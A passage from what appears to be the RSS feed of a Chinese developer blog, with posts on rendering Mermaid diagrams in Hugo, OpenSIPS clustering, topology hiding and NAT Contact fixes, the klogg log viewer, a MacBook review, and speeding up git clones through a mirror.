&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;module&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mermaid&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.esm.min.mjs&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mermaid&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;initialize&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;startOnLoad&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt; });
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{{ end }}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;step2&#34;&gt;step2:&lt;/h1&gt;
&lt;p&gt;在layouts/_default/_markup/render-codeblock-mermaid.html&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;pre&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mermaid&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {{- .Inner | htmlEscape | safeHTML }}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;pre&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{{ .Page.Store.Set &amp;#34;hasMermaid&amp;#34; true }}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;在blog中增加如下代码&#34;&gt;在blog中增加如下代码&lt;/h1&gt;
&lt;pre class=&#34;mermaid&#34;&gt;pie
    title French Words I Know
    &amp;#34;Merde&amp;#34; : 50
    &amp;#34;Oui&amp;#34; : 35
    &amp;#34;Alors&amp;#34; : 10
    &amp;#34;Non&amp;#34; : 5
&lt;/pre&gt;
&lt;pre class=&#34;mermaid&#34;&gt;sequenceDiagram
    title French Words I Know
    autonumber
    Alice-&amp;gt;&amp;gt;Bob: hello
    Bob--&amp;gt;&amp;gt;Alice: hi
    Alice-&amp;gt;Bob: talking
&lt;/pre&gt;</description>
    </item>
    <item>
      <title>集群共享分机注册信息</title>
      <link>https://wdd.js.org/opensips/ch9/cluster-share-location/</link>
      <pubDate>Fri, 20 May 2022 11:52:22 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch9/cluster-share-location/</guid>
      <description>&lt;p&gt;共享分机注册信息有两种方式&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;集群使用相同的数据库，多个节点实时读取数据
&lt;ol&gt;
&lt;li&gt;优点：使用简单，即使所有节点重启，也能立即从数据库中恢复分机注册数据&lt;/li&gt;
&lt;li&gt;缺点：对数据库过于依赖，一旦数据库出现性能瓶颈，则会立即影响所有的呼叫&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;是用cluster模块，不使用数据库，通过opensips自带的二进制同步方式
&lt;ol&gt;
&lt;li&gt;优点：不用数据库，消息处理速度快，减少对数据库的压力&lt;/li&gt;
&lt;li&gt;缺点：一旦所有节点挂掉，所有的分机注册信息都会损失。但是挂掉所有节点的概率还是比较小的。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;今天要讲的方式就是通过cluster的方式进行共享注册信息的方案。&lt;/p&gt;
&lt;p&gt;假设有三个节点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在其中一个节点上注册的分机信息会同步给其他的节点&lt;/li&gt;
&lt;li&gt;假设其中节点a重启了，节点a会自动选择b或者c来拉取第一次初始化的分机信息&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch9/cluster-share-location/2022-12-03-20-56-05.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;举例来说：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;8001分机在b上注册成功&lt;/li&gt;
&lt;li&gt;b把8001的注册信息通过cluster模块通知给a和c&lt;/li&gt;
&lt;li&gt;8002分机在a上注册成功&lt;/li&gt;
&lt;li&gt;a把8002的注册信息通过cluster模块通知给b和c&lt;/li&gt;
&lt;li&gt;此时整个集群有两个分机8001和8002&lt;/li&gt;
&lt;li&gt;节点c突然崩溃重启&lt;/li&gt;
&lt;li&gt;节点c重启之后，向b发出请求，获取所有注册的分机&lt;/li&gt;
&lt;li&gt;节点b像节点c推送全量的分机注册信息&lt;/li&gt;
&lt;li&gt;此时三个节点又恢复同步状态&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;cluster表设计:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;空的字段我就没写了，flags字段必须设置为seed,  这样节点重启后，才知道要像哪个节点同步全量数据&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;id,cluster_id,node_id,url,state,flags
1,1,1,bin:a:5000,1,seed
2,1,2,bin:b:5000,1,seed
3,1,3,bin:c:5000,1,seed
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;脚本修改：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 增加 bin的listen, 对应cluster表的url
listen=bin:192.168.2.130:5000

# 加载proto_bin和clusterer模块
loadmodule &amp;#34;proto_bin.so&amp;#34;

loadmodule &amp;#34;clusterer.so&amp;#34;
modparam(&amp;#34;clusterer&amp;#34;, &amp;#34;db_url&amp;#34;, &amp;#34;mysql:xxxx&amp;#34;) # 设置数据库地址
modparam(&amp;#34;clusterer&amp;#34;, &amp;#34;current_id&amp;#34;, 1) # 设置当前node_id

modparam(&amp;#34;usrloc&amp;#34;, &amp;#34;working_mode_preset&amp;#34;, &amp;#34;full-sharing-cluster&amp;#34;)
modparam(&amp;#34;usrloc&amp;#34;, &amp;#34;location_cluster&amp;#34;, 1) # 设置当前的集群id
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其他操作保持原样，opensips就会自动同步分机数据了。&lt;/p&gt;</description>
    </item>
    <item>
      <title>klogg: 目前我最喜欢的日志查看工具</title>
      <link>https://wdd.js.org/posts/2022/04/cipwms/</link>
      <pubDate>Wed, 13 Apr 2022 19:41:53 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/04/cipwms/</guid>
      <description>&lt;h1 id=&#34;项目信息&#34;&gt;项目信息&lt;/h1&gt;
&lt;p&gt;github地址 &lt;a href=&#34;https://github.com/variar/klogg&#34;&gt;https://github.com/variar/klogg&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/04/cipwms/2022-10-29-19-44-57.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-安装&#34;&gt;1. 安装&lt;/h1&gt;
&lt;p&gt;klogg是个跨平台软件，windows, mac, linux都可以安装。具体安装方式参考github项目地址&lt;/p&gt;
&lt;h1 id=&#34;2-界面布局&#34;&gt;2. 界面布局&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/04/cipwms/2022-10-29-19-45-05.png&#34;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;文件信息栏&lt;/li&gt;
&lt;li&gt;日志栏&lt;/li&gt;
&lt;li&gt;过滤器设置栏&lt;/li&gt;
&lt;li&gt;过滤后的日志显示栏&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;3-文件加载&#34;&gt;3. 文件加载&lt;/h1&gt;
&lt;p&gt;klogg支持多种方式加载日志文件&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;将日志文件拖动到klogg中&lt;/li&gt;
&lt;li&gt;直接将常见的压缩包文件拖动到klogg中，klogger将会自动将其解压后展示&lt;/li&gt;
&lt;li&gt;支持从http url地址下载日志，然后查看&lt;/li&gt;
&lt;li&gt;支持从剪贴板复制日志，然后展示&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/04/cipwms/2022-10-29-19-45-13.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;4-过滤表达式&#34;&gt;4. 过滤表达式&lt;/h1&gt;
&lt;p&gt;因为klogg支持正则过滤，所以他的功能就非常强悍了。&lt;/p&gt;
&lt;p&gt;逻辑表达式&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;表达式&lt;/th&gt;
          &lt;th&gt;例子&lt;/th&gt;
          &lt;th&gt;备注&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;与  and&lt;/td&gt;
          &lt;td&gt;&amp;ldquo;open&amp;rdquo; and &amp;ldquo;close&amp;rdquo;&lt;/td&gt;
          &lt;td&gt;包含open，并且包含close&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;或 or&lt;/td&gt;
          &lt;td&gt;&amp;ldquo;open&amp;rdquo; or &amp;ldquo;close&amp;rdquo;&lt;/td&gt;
          &lt;td&gt;包含open, 或者 close&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;非 not&lt;/td&gt;
          &lt;td&gt;not(&amp;ldquo;open&amp;rdquo;)&lt;/td&gt;
          &lt;td&gt;不包含open&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;与或非同时支持复杂的运算，例如包含open 但是不包含close: &lt;code&gt;&amp;quot;open&amp;quot; and not(&amp;quot;close&amp;quot;)&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;5-快捷方式&#34;&gt;5. 快捷方式&lt;/h1&gt;
&lt;p&gt;klogg的快捷方式很多参考了vim, vim使用者非常高兴。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;键&lt;/th&gt;
          &lt;th&gt;动作&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;arrows&lt;/td&gt;
          &lt;td&gt;上下或者左右移动&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;[number] j/k&lt;/td&gt;
          &lt;td&gt;支持用j/k上下移动&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;h/l&lt;/td&gt;
          &lt;td&gt;支持用h/l左右移动&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;^ or $&lt;/td&gt;
          &lt;td&gt;滚动到某行的开始或者结尾&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;[number] g&lt;/td&gt;
          &lt;td&gt;跳到对应的行&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;entered&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;G&lt;/td&gt;
          &lt;td&gt;跳到第一行&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Shift+G&lt;/td&gt;
          &lt;td&gt;跳到最后一行&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Alt+G&lt;/td&gt;
          &lt;td&gt;显示跳到某一行的对话框&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;rsquo; or &amp;quot;&lt;/td&gt;
          &lt;td&gt;在当前屏幕快速搜索&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;(forward and backward)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;n or N&lt;/td&gt;
          &lt;td&gt;向前或者向后跳&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;* or .&lt;/td&gt;
          &lt;td&gt;search for the next occurrence of the currently selected text&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;/ or ,&lt;/td&gt;
          &lt;td&gt;search for the previous occurrence of the currently selected text&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;f&lt;/td&gt;
          &lt;td&gt;流的方式，类似 tail -f&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;!-- raw HTML omitted --&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;m&lt;/td&gt;
          &lt;td&gt;标记某一行，标记后的行会自动加入过滤结果中&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;[ or ]&lt;/td&gt;
          &lt;td&gt;跳转到上一个或者下一标记点&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;+ or -&lt;/td&gt;
          &lt;td&gt;调整过滤窗口的尺寸&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;v&lt;/td&gt;
          &lt;td&gt;循环切换各种显示模式&lt;!-- raw HTML omitted --&gt;- Matches: 只显式匹配的内容&lt;!-- raw HTML omitted --&gt;- Marks: 只显式标记的内容&lt;!-- raw HTML omitted --&gt;- Marks and Matchs：显示匹配和标记的内容&lt;!-- raw HTML omitted --&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;(Marks and Matches -&amp;gt; Marks -&amp;gt; Matches)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;F5&lt;/td&gt;
          &lt;td&gt;重新加载文件&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Ctrl+S&lt;/td&gt;
          &lt;td&gt;Set focus to search string edit box&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Ctrl+Shift+O&lt;/td&gt;
          &lt;td&gt;打开对话框去选择其他文件&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/variar/klogg/blob/master/DOCUMENTATION.md&#34;&gt;https://github.com/variar/klogg/blob/master/DOCUMENTATION.md&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>opensips 477 Send failed (477/TM)</title>
      <link>https://wdd.js.org/opensips/ch7/tm-send-failed/</link>
      <pubDate>Fri, 08 Apr 2022 22:32:27 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch7/tm-send-failed/</guid>
      <description>&lt;p&gt;这个报错比较容易出现在tcp转udp的场景，可以看以下的时序图&lt;/p&gt;
&lt;p&gt;ab之间用tcp通信，bc之间用udp通信。在通话建立后，c给b发送了bye请求，但是b发送给了c 477。正常来说b应该把bye转发给a.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch7/tm-send-failed/2022-12-02-13-21-07.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么问题出在哪里呢？&lt;/p&gt;
&lt;p&gt;问题就出在update请求的响应上，update的响应200ok中带有Contact头，如果是Contact是个nat的地址，没有经过fixed nat, 那么b是无法直接给nat内部的地址发送请求的。&lt;/p&gt;
&lt;p&gt;处理的办法也很简单，就是在收到a返回的200ok时，执行fix_nated_contact()&lt;/p&gt;
&lt;p&gt;遇到这种问题，往往进入一种思维误区，就是在INVITE请求成功后，fix了nat Contact后，Contact头是不会变的。&lt;/p&gt;
&lt;p&gt;但是实际上，很多SIP请求，例如NOTIFY, UPDATE都会携带请求和响应都会携带Contact, 如果只处理了INVITE的Contact头，没有处理其他携带Contact的sip请求或者响应，就必然也会遇到类似的问题。&lt;/p&gt;
&lt;p&gt;我们知道SIP的Contact后，决定了序列化请求的request url。如果Contact处理的有问题，必然在按照request url转发的时候出现问题。&lt;/p&gt;
&lt;p&gt;综上所述：无论请求还是响应，都要考虑这个消息是否携带了Contact头，以及是否需要fix nat Contact。&lt;/p&gt;</description>
    </item>
    <item>
      <title>macbook pro 使用1664天的感受</title>
      <link>https://wdd.js.org/posts/2022/04/er3vob/</link>
      <pubDate>Mon, 04 Apr 2022 21:29:13 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/04/er3vob/</guid>
      <description>&lt;p&gt;我之前写过一篇文章&lt;a href=&#34;https://www.yuque.com/wangdd/blog/kxpswu&#34;&gt;《macbook pro使用三年后的感受》&lt;/a&gt;，今天这篇文章是用4.5年的感受。&lt;/p&gt;
&lt;p&gt;再次梳理一下，中间遇到过的问题&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;蝴蝶键盘很早有有些问题了，最近疫情在家，键盘被用坏了，J键直接坏了。只能外接键盘来用&lt;/li&gt;
&lt;li&gt;屏幕下方出现淡红色的纹路，不太明显，基本不影响使用&lt;/li&gt;
&lt;li&gt;中间我自己给macbook换过一次电池，换电池之前只要不插电，macbook很容易就关机了&lt;/li&gt;
&lt;li&gt;风扇经常转，噪音有点吵，我已经觉得无所谓了&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;17年买这台电脑的时候，应该是9400左右。配置应该是最低配的 i5双核2.3Ghz, 8G内存，128硬盘的。&lt;/p&gt;
&lt;p&gt;有些人可能惊讶，128G的硬盘怎么能够用的。但是我的确够用，我的磁盘还有将近50G的剩余空间呢。&lt;/p&gt;
&lt;p&gt;我不是视频或者影音工作者，用的软件比较少。整个应用程序所占用的空间才4个多G。剩下的文稿可能大部分是代码。&lt;/p&gt;
&lt;p&gt;由于我我基本上都是远程用ssh连上nuc上开发，所以mac上的资料更少。&lt;/p&gt;
&lt;p&gt;但是macbook键盘坏了这个问题，是不能忍的。偶尔要移动办工的时候，不可能再带个外接键盘吧。&lt;/p&gt;
&lt;p&gt;是时候准备和陪伴我4.5年的电脑说再见了。&lt;/p&gt;
&lt;p&gt;本来想买14寸的macbook pro m1的，但是重量的增加以及很丑的刘海也是我不能忍的。&lt;/p&gt;
&lt;p&gt;所以我觉得我会买一台轻便点的windows笔记本，而且windows还有一个很吸引我的点，就是linux子系统。这个linux子系统，要比mac的系统更加linux。&lt;/p&gt;
&lt;p&gt;各位同学有没有推荐的windows的轻便笔记本呢？&lt;/p&gt;</description>
    </item>
    <item>
      <title>拓扑隐藏学习以及实践</title>
      <link>https://wdd.js.org/opensips/ch8/topology-hiding/</link>
      <pubDate>Thu, 31 Mar 2022 20:34:02 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch8/topology-hiding/</guid>
      <description>&lt;h1 id=&#34;1-拓扑隐藏功能&#34;&gt;1. 拓扑隐藏功能&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;删除Via头&lt;/li&gt;
&lt;li&gt;删除Route&lt;/li&gt;
&lt;li&gt;删除Record-Route&lt;/li&gt;
&lt;li&gt;修改Contact&lt;/li&gt;
&lt;li&gt;可选隐藏Call-ID&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;如下图所示，根据SIP的Via, Route, Record-Route的头，往往可以推测服务内部的网络结构。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/__graphviz/df4521ccc5dea3626b5b7ddd87d68047.svg#lake_card_v2=eyJ0eXBlIjoiZ3JhcGh2aXoiLCJjb2RlIjoiZGlncmFwaHtcblx0cmFua2Rpcj1MUlxuXHRhIC0-IGJcblx0YiAtPiBjXG5cdGMgLT4g55So5oi3XG59IiwidXJsIjoiaHR0cHM6Ly9jZG4ubmxhcmsuY29tL3l1cXVlL19fZ3JhcGh2aXovZGY0NTIxY2NjNWRlYTM2MjZiNWI3ZGRkODdkNjgwNDcuc3ZnIiwiaWQiOiJDN3FXYiIsIm1hcmdpbiI6eyJ0b3AiOnRydWUsImJvdHRvbSI6dHJ1ZX0sImNhcmQiOiJkaWFncmFtIn0=&#34;&gt;
我们不希望别人知道的我们的内部网络结构。我们只希望只能看到C这个sip server。&lt;!-- raw HTML omitted --&gt;经过拓扑隐藏过后&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用户看不到关于a、b的via, route, record-route头&lt;/li&gt;
&lt;li&gt;用户看到的Contact头被修改成C的IP地址&lt;/li&gt;
&lt;li&gt;可以选择把原始的Call-ID也修改&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/__graphviz/9c819af57d08e4316ef94bc96d54de56.svg#lake_card_v2=eyJ0eXBlIjoiZ3JhcGh2aXoiLCJjb2RlIjoiZGlncmFwaHtcblx0cmFua2Rpcj1MUlxuXHRjIC0-IOeUqOaIt1xufSIsInVybCI6Imh0dHBzOi8vY2RuLm5sYXJrLmNvbS95dXF1ZS9fX2dyYXBodml6LzljODE5YWY1N2QwOGU0MzE2ZWY5NGJjOTZkNTRkZTU2LnN2ZyIsImlkIjoiSlZwYUMiLCJtYXJnaW4iOnsidG9wIjp0cnVlLCJib3R0b20iOnRydWV9LCJjYXJkIjoiZGlhZ3JhbSJ9&#34;&gt;当然，拓扑隐藏除了可以隐藏一些信息，也有一个其他的好处：减少SIP消息包的长度。如果SIP消息用UDP传输，减少包的体积，可以大大降低UDP分片的可能性。&lt;/p&gt;
&lt;p&gt;所以，综上所述：拓扑隐藏有以下好处&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;隐藏服务内部网络结构&lt;/li&gt;
&lt;li&gt;减少SIP包的体积&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2-脚本例子&#34;&gt;2. 脚本例子&lt;/h1&gt;
&lt;p&gt;拓扑隐藏的实现并不复杂。首先要加载拓扑隐藏的模块&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;topology_hiding.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;21-初始化路由的处理&#34;&gt;2.1 初始化路由的处理&lt;/h2&gt;
&lt;p&gt;在初始化路由里，只需要调用topology_hiding()&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;U 表示不隐藏Contact的用户名信息&lt;/li&gt;
&lt;li&gt;C 表示隐藏Call-ID&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# if it&amp;#39;s an INVITE dialog, we can create the dialog now, will lead to cleaner SIP messages&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        create_dialog&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# we do topology hiding, preserving the Contact Username and also hiding the Call-ID&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;topology_hiding&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UC&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;exit;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;22-序列化路由的处理&#34;&gt;2.2 序列化路由的处理&lt;/h2&gt;
&lt;p&gt;在序列化请求中，只需要调用topology_hiding_match(), 后续的就可以交给OpenSIPS处理了。&lt;/p&gt;</description>
    </item>
    <item>
      <title>github clone加速</title>
      <link>https://wdd.js.org/posts/2022/03/sny4rb/</link>
      <pubDate>Tue, 29 Mar 2022 09:17:23 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/03/sny4rb/</guid>
      <description>&lt;p&gt;我有一个github仓库，&lt;a href=&#34;https://github.com/wangduanduan/opensips&#34;&gt;https://github.com/wangduanduan/opensips&lt;/a&gt;， 这个源码比较大，git clone 比较慢。&lt;/p&gt;
&lt;p&gt;我们使用&lt;a href=&#34;https://www.gitclone.com/&#34;&gt;https://www.gitclone.com/&lt;/a&gt;提供的加速服务。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 从github上clone&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clone https://github.com/wangduanduan/opensips.git
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 从gitclone上clone&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 只需要在github前面加上gitclone.com/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 速度就非常快，达到1mb/s&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clone https://gitclone.com/github.com/wangduanduan/opensips.git
